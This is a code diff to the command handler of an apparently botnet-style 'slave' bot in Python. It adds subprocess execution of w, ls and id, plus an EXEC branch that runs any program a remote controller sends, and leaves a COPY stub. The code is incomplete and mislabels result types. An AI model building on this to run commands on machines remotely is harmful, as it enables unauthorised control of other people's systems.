@@ -1,36 +1,34 @@
 from threading import Thread
-import os
 import subprocess
+from typing import Dict
+
 from common.data.commands import CommandExecutionRequest, CommandExecutionResult, CommandTypes, CommandStatus
 from slave.src.data.context import get_new_commands_arrived_condition, \
     get_commands_from_queue, get_bot_id
 
-
-def __execute_ls(param: str) -> CommandExecutionResult:
-    try:
-        files_in_dir = os.listdir(param)
-        return CommandExecutionResult(bot_id=get_bot_id(), command=CommandTypes.LS, param=param,
-                                      status=CommandStatus.SUCCESS, results=files_in_dir)
-    except FileNotFoundError as e:
-        return CommandExecutionResult(bot_id=get_bot_id(), command=CommandTypes.LS, param=param,
-                                      status=CommandStatus.ERROR, results=[e])
+__COMMANDS_EXECUTABLE_BY_SUBPROCESS: Dict[CommandTypes, str] = {CommandTypes.W: "w",
+                                                                CommandTypes.LS: "ls",
+                                                                CommandTypes.ID: "id"}
 
 
-def __execute_w() -> CommandExecutionResult:
-    result = subprocess.run(["w"], capture_output=True, text=True)
+def __execute_command_as_subprocess(command: str, param: str) -> CommandExecutionResult:
+    result = subprocess.run([command, param], capture_output=True, text=True)
     if result.stderr != "":
         return CommandExecutionResult(bot_id=get_bot_id(), command=CommandTypes.W, param="",
                                       status=CommandStatus.ERROR, results=[result.stderr])
 
-    return CommandExecutionResult(bot_id=get_bot_id(), command=CommandTypes.LS, param="",
+    return CommandExecutionResult(bot_id=get_bot_id(), command=CommandTypes.W, param="",
                                   status=CommandStatus.SUCCESS, results=[result.stdout])
 
 
-
-
-
 def __execute_command(command: CommandExecutionRequest) -> CommandExecutionResult:
-    pass
+    if command.command in __COMMANDS_EXECUTABLE_BY_SUBPROCESS:
+        return __execute_command_as_subprocess(__COMMANDS_EXECUTABLE_BY_SUBPROCESS[command.command], command.param)
+    elif command.command == CommandTypes.EXEC:
+        return __execute_command_as_subprocess(command.param, "")
+    elif command.command == CommandTypes.COPY:
+        pass
+    raise AssertionError("Unreachable state reached")
 
 
 def __handle_commands() -> None:
